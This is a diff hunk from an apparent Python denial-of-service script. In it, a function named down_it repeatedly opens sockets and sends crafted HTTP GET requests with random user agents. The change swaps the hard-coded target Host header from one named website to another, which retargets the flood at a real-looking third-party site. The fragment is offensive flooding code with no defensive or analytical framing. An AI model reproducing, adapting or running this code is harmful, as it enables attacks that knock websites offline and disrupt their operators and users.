@@ -44,7 +44,7 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+"www.xiaobaijidi.net"+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			packet = str("GET / HTTP/1.1\nHost: "+"www.sibida.net"+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
